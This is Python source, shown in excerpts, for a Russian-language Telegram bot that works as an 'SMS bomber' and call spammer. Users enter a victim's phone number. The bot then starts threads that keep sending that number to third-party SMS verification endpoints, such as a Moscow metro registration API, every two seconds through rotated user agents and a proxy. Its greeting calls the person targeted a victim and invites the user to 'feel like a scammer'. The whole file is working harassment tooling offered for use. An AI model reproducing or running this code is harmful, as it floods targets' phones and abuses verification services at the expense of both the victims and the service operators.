...
btn_spam_sms = types.KeyboardButton(text="start sms spam")
btn_spam_call = types.KeyboardButton(text="start call spam")
btn_stop_spam_call = types.KeyboardButton(text="stop spam")
main_keyboard.add(btn_spam_call, btn_spam_sms, btn_stop_spam_call)

del_spam_keyboard = types.InlineKeyboardMarkup()
btn_del = types.InlineKeyboardButton(callback_data="stop_spam", text="Прекратить спам")
del_spam_keyboard.add(btn_del)

del_white_keyboard = types.InlineKeyboardMarkup()
btn_del_white = types.InlineKeyboardButton(callback_data="del_white", text="Удалить из белого списка")
del_white_keyboard.add(btn_del_white)

del_black_keyboard = types.InlineKeyboardMarkup()
btn_del_black = types.InlineKeyboardButton(callback_data="del_black", text="Удалить из черного списка")
del_black_keyboard.add(btn_del_black)


class SpamUser:
    def __init__(self, userid, number, type, start_time, id=None):
        self.userid = userid
        self.number = number
        self.type = type
        ...
        self.id = id
        if type == "sms":
            self.thread = Thread(target=spam_sms, args=(number, userid))
        else:
            self.thread = Thread(target=spam_call, args=(number,))
    ...
    def __str__(self):
        ...
        if self.id is not None:
            s += "ID: " + str(self.id) + "\n"
        return s + "User ID: " + str(
            self.userid) + "\nTelephone: " + self.number + "\nType: " + self.type + "\nStart time: " + str(
            self.start_time)
...
class SpamUserBox:
    ...
    def update_spam_list(self):
        try:
            ...
            cur = con.cursor()
            res = cur.execute("SELECT * FROM sms_bomber")
            for row in res:
                obj = SpamUser(int(row[1]), row[2], row[3], row[4], row[0])
                '''if blackbox.presense_user(obj.userid) == False and whitebox.presense_number(obj.number) == False:
                    print("Заебало нахуй")
            ...
            print("SPAM UPDATE ERROR: ", str(er))

    def addspam(self, obj) -> str:

        alphabet = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
        for i in obj.number:
            if i not in alphabet:
                return "❗ Допускаются ТОЛЬКО цифры, пробелы и прочие знаки (+, -, скобки)"
        try:
            con = sqlite3.connect(dbname)
            cur = con.cursor()
            data = (obj.number, obj.type)
            res = cur.execute("SELECT * FROM sms_bomber WHERE phone_number = ? AND type = ?", data).fetchone()
            if res is not None:
                return "❗ " + obj.type + " спам с таким номером уже существует"
            data = (obj.userid, obj.number, obj.type, obj.start_time)
            cur.execute("INSERT INTO sms_bomber (user_id, phone_number, type, start_time) VALUES(?, ?, ?, ?)", data)
            con.commit()
            res = cur.execute("SELECT * FROM sms_bomber ORDER BY id DESC")
            for row in res:
                obj.id = row[0]
                break
            print("\nНовый спам:\n", obj)
            '''if blackbox.presense_user(obj.userid) == False and whitebox.presense_number(obj.number) == False:
                print("\n", blackbox.presense_user(obj.userid), "\nwhite:", whitebox.presense_number(obj.number))
            ...
            self.Box.append(obj)
            con.close()
            return "✅ " + obj.type + " спам запущен по номеру " + obj.number
        except Exception as er:
            print("ERROR: ", str(er))
            return "🔧 ERROR: " + str(er)

    '''def delspam(self, user_id,  num, type) -> str:
        try:
            con = sqlite3.connect(dbname)
            cur = con.cursor()
            data = (user_id, num, type)
            cur.execute(f"DELETE FROM sms_bomber WHERE user_id = ? AND phone_number = ? AND type = ? ", data)
            con.commit()
            con.close()
            for obj in self.Box:
                if obj.type == type and obj.number == num and obj.userid == user_id:
                    self.Box.remove(obj)
                    print("\n\nСпам остановлен: ", str(obj), "\n\n")
            return type + " спам по номеру " + num + " остановлен"
        except Exception as er:
            print("ERROR: ", str(er))
            return "ERROR: " + str(er)'''

    def del_spam_id(self, id, user_id):
        try:
            con = sqlite3.connect(dbname)
            cur = con.cursor()
            data = (id, user_id)
            cur.execute(f"DELETE FROM sms_bomber WHERE id = ? AND user_id = ?", data)
            con.commit()
            con.close()
            for obj in self.Box:
                if obj.id == id and obj.userid == user_id:
                    log_spam(obj)
                    self.Box.remove(obj)
                    return "❌ " + obj.type + " cпам по номеру " + obj.number + " был прекращен"
            return "🔧 Спам не удалось прекратить"
        except Exception as er:
            print("ERROR: ", str(er))
            return "🔧 Спам не удалось прекратить\nERROR: " + str(er)

    def del_all_spam(self):
        try:
            con = sqlite3.connect(dbname)
            cur = con.cursor()
            cur.execute("DELETE FROM sms_bomber")
            con.commit()
            con.close()
            self.Box.clear()
            return "❌ Все спамы удалены"
        except Exception as er:
            return "🔧 ERROR: " + str(er)

    def show_all_spam(self, user_id):
        cntr = 0
        for obj in self.Box:
            if obj.userid == user_id:
                cntr += 1
                send_message(user_id, str(obj), del_spam_keyboard)
        if cntr == 0:
            send_message(user_id, "У вас нет активных спамов")

    def show_all_spam_adm(self, user_id):
        cntr = 0
        for obj in self.Box:
            cntr += 1
            send_message(user_id, str(obj), del_spam_keyboard)
        if cntr == 0:
            send_message(user_id, "Спамов нет")

    def get_array(self):
        return self.Box


def spam_sms(number, user_id):
    b = True
    while b:
        '''if blackbox.presense_user(user_id) == True or whitebox.presense_number(number) == True:
            print(f"\n\nNumber {number}: has stoped\n\n")
            return'''
        time.sleep(2)
        user = user_agents.get_user()
        proxies = {'http': 'http//' + '172.67.180.31:80'}
        num = number
        num2 = ""
        num2 += "+"
        num2 += '7'
        ...
        try:
            for obj in spambox.get_array():
                if obj.number == number:
                    if blackbox.presense_user(user_id) == False and whitebox.presense_number(number) == False:
                        try:
                            header = {
                        ...
                        try:
                            ...
                            pass
                        print(f"\nNumber {number}: received spam\n")
                    else:
                        print(f"\nNumber {number}: stopping\n")
                        time.sleep(10)
                    # print(number, "\n")
                    b = True
                    break
    ...
    while b:
        try:
            for obj in spambox.get_array():
                if obj.number == number:
                    for i in req_list:
                        req = requests.post(i, data={"phone": number})
                        print("Статус: ", req.status_code)
                    print(number)
                    time.sleep(2)
                    b = True
                    break
...
class WhiteNumber:
    ...
    def __str__(self) -> str:
        ...
        if self.id is not None:
            res += "ID: " + str(self.id) + "\n"
        return res + "Phone number: " + str(self.number)
...
class WhiteList:
    ...
    def update_list(self):
        ...
        try:
            con = sqlite3.connect(dbname)
            cur = con.cursor()
            res = cur.execute("SELECT * FROM white_list")
            for row in res:
                obj = WhiteNumber(row[1], row[0])
                self.Box.append(obj)
            con.close()
        except Exception as er:
            print("White_list update ERROR: ", str(er))

    def add_number_to_whitelist(self, number):
        try:
            con = sqlite3.connect(dbname)
            cur = con.cursor()
            res = cur.execute("SELECT * FROM white_list WHERE number = ?", (number,)).fetchone()
            if res is not None:
                return "Такой номер уже занесен в белый список"
            cur.execute("INSERT INTO white_list(number) VALUES (?)", (number,))
            con.commit()
            res = cur.execute("SELECT * FROM white_list ORDER BY id DESC")
            newuser = WhiteNumber(str(number))
            for row in res:
                newuser.id = row[0]
                break
            con.close()
            self.Box.append(newuser)
            print("Новый номер в белом списке: \n", newuser)
            return "✅ " + newuser.number + " добавлен в белый список"
        except Exception as er:
            print("change whitelist ERROR: ", str(er))
            return "ERROR: " + str(er)

    def del_number_from_whitelist(self, id) -> str:
        try:
            con = sqlite3.connect(dbname)
            cur = con.cursor()
            cur.execute("DELETE FROM white_list WHERE id=? ", (id,))
            con.commit()
            con.close()
            for obj in self.Box:
                if obj.id == id:
                    self.Box.remove(obj)
                    return "❌ номер " + obj.number + " удален из белого списка"
            return "🔧 Такого номера уже нет в белом списке"
        except Exception as er:
            print("Change whitelist ERROR: ", str(er))
            return "ERROR: " + str(er)

    def show_all_white_user(self, user_id):
        cntr = 0
        for obj in self.Box:
            cntr += 1
            send_message(user_id, str(obj), del_white_keyboard)
        if cntr == 0:
            send_message(user_id, "В белом списке нет номеров")

    def presense_number(self, number):
        for obj in self.Box:
            if str(obj.number) == str(number):
                return True
        return False
...
class BlackUser:
    ...
    def __str__(self) -> str:
        ...
        if self.id is not None:
            res += "ID: " + str(self.id) + "\n"
        return res + "User ID: " + str(self.user_id)
...
class BlackList:
    ...
    def update_list(self):
        ...
        try:
            con = sqlite3.connect(dbname)
            cur = con.cursor()
            res = cur.execute("SELECT * FROM black_list")
            for row in res:
                obj = BlackUser(row[1], row[0])
                self.Box.append(obj)
            con.close()
        except Exception as er:
            print("Black_list update ERROR: ", str(er))

    def add_user_to_blacklist(self, user_id):
        try:
            con = sqlite3.connect(dbname)
            cur = con.cursor()
            res = cur.execute("SELECT * FROM black_list WHERE user_id =?", (user_id,)).fetchone()
            if res is not None:
                return "Такой пользователь уже занесен в черный список"
            cur.execute("INSERT INTO black_list(user_id) VALUES (?)", (user_id,))
            con.commit()
            res = cur.execute("SELECT * FROM black_list ORDER BY id DESC")
            newuser = BlackUser(user_id)
            for row in res:
                newuser.id = row[0]
                break
            con.close()
            self.Box.append(newuser)
            print("Новый пользователь в черном списке: ", newuser)
            return "✅ " + newuser.user_id + " добавлен в черный список"
        except Exception as er:
            print("change blacklist ERROR: ", str(er))
            return "ERROR: " + str(er)

    def del_user_from_blacklist(self, id) -> str:
        try:
            con = sqlite3.connect(dbname)
            cur = con.cursor()
            cur.execute("DELETE FROM black_list WHERE id=? ", (id,))
            con.commit()
            con.close()
            for obj in self.Box:
                print(obj)
                if obj.id == id:
                    print("check")
                    self.Box.remove(obj)
                    return "❌ пользователь с ID " + obj.user_id + " удален из черного списка"
            return "🔧 Такого пользователя уже нет в черном списке"
        except Exception as er:
            print("Change whitelist ERROR: ", str(er))
            return "ERROR: " + str(er)

    def show_all_black_user(self, user_id):
        cntr = 0
        for obj in self.Box:
            cntr += 1
            send_message(user_id, str(obj), del_black_keyboard)
        if cntr == 0:
            send_message(user_id, "В черном списке нет пользователей")

    def presense_user(self, user_id):
        for obj in self.Box:
...
blackbox = BlackList()
dbname = "spamDB.db"
req_list = ["https://lk.mosmetro.ru/api/registrations/v1.0/verify"]


def clear_num(number):
...
def get_spam_id_from_message(msg) -> int:
    text = ""
    for i in msg:
        if i == "\n":
            break
...
def get_any_id_from_message(msg) -> int:
    text = msg.split("\n")[0]
    text = text.split(": ")[1]
    return int(text)
...
def log_spam(obj):
    try:
        con = sqlite3.connect(dbname)
        cur = con.cursor()
        data = (obj.userid, obj.number, obj.type, obj.start_time, str(datetime.datetime.now()))
        cur.execute(
            "INSERT INTO spam_log(user_id, phone_number, spam_type, start_time, stop_time) VALUES(?, ?, ?, ?, ?)", data)
        con.commit()
        con.close()
    except Exception as er:
        print("LOG ERROR: ", str(er))
...
def start(message):
    ...
    send_message(user_id,
                 "HELLO!! Это бот bomber, способный спамить смс и звонками на телефон жертвы. Почувствуй себя скамером!",
                 main_keyboard)
...
def start(message):
    user_id = message.from_user.id
    if user_id == 917669682:
        send_message(user_id,
                     "Это админ меню, вот команды:\n/add_white_number\n/add_black_user\n/del_white_number\n/del_black_user\n/show_all_spam\n/del_all_spam")


@bot.message_handler(commands=['del_white_number'])
def start(message):
    if message.from_user.id == 917669682:
        user_id = message.from_user.id
        whitebox.show_all_white_user(user_id)


@bot.message_handler(commands=['del_black_user'])
def start(message):
    if message.from_user.id == 917669682:
        user_id = message.from_user.id
        blackbox.show_all_black_user(user_id)


@bot.message_handler(commands=['add_white_number'])
def start(message):
    user_id = message.from_user.id
    if message.from_user.id == 917669682:
        send_message(user_id, "Номер телефона: ")
        bot.register_next_step_handler(message, get_white_number)


@bot.message_handler(commands=['add_black_user'])
def start(message):
    user_id = message.from_user.id
    if message.from_user.id == 917669682:
        send_message(user_id, "ID пользователя: ")
        bot.register_next_step_handler(message, get_black_user)


@bot.message_handler(commands=['show_all_spam'])
def start(message):
    user_id = message.from_user.id
    if user_id == 917669682:
        spambox.show_all_spam_adm(user_id)


@bot.message_handler(commands=['del_all_spam'])
def start(message):
    user_id = message.from_user.id
    if user_id == 917669682:
        send_message(user_id, spambox.del_all_spam())
...
def get_message(message):
    ...
    if text == "start sms spam":
        send_message(user_id, "✏ Введите номер телефона (Пример: 79185551616, 79096665544): ")
        bot.register_next_step_handler(message, get_phone_sms)
    elif text == "stop spam":
        spambox.show_all_spam(user_id)
    elif text == "start call spam":
        send_message(user_id, "✏ Введите номер телефона (Пример: 79185551616, 79096665544): ")
        bot.register_next_step_handler(message, get_phone_call)
    else:
        send_message(user_id, "Такого варианта нет\nВведите команду \"start\", чтобы вызвать клавиатуру")


def get_phone_sms(message):
    phone = message.text
    tempobj = SpamUser(message.from_user.id, clear_num(phone), "sms", str(datetime.datetime.now()))
    send_message(message.from_user.id, spambox.addspam(tempobj))


def get_phone_call(message):
    phone = message.text.lower()
    phone.replace(" ", "")
    tempobj = SpamUser(message.from_user.id, phone, "call", str(datetime.datetime.now()))
    send_message(message.from_user.id, spambox.addspam(tempobj))


def get_white_number(message):
    phone = message.text.lower()
    send_message(message.from_user.id, whitebox.add_number_to_whitelist(clear_num(phone)))


def get_black_user(message):
    phone = message.text.lower()
    phone.replace(" ", "")
    send_message(message.from_user.id, blackbox.add_user_to_blacklist(phone))
...
def get_callback(call):
    ...
    if data == "stop_spam":
        ...
        bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id, text=spambox.del_spam_id(
            get_any_id_from_message(call.message.text), user_id))
        print("Количество потоков: ", threading.active_count())
    if data == "del_white":
        bot.edit_message_reply_markup(chat_id=user_id, message_id=call.message.message_id, reply_markup=None)
        bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id, text=whitebox.
                              del_number_from_whitelist(get_any_id_from_message(call.message.text)))
    if data == "del_black":
        bot.edit_message_reply_markup(chat_id=user_id, message_id=call.message.message_id, reply_markup=None)
        bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id,
                              text=blackbox.del_user_from_blacklist(
                                  get_any_id_from_message(call.message.text)))


def main():
    blackbox.update_list()
    whitebox.update_list()
    spambox.update_spam_list()
    print(blackbox)
    print(whitebox)
    print(spambox)
    print("Старт, Количество потоков: ", threading.active_count())
    poolthread = Thread(target=bot.infinity_polling)
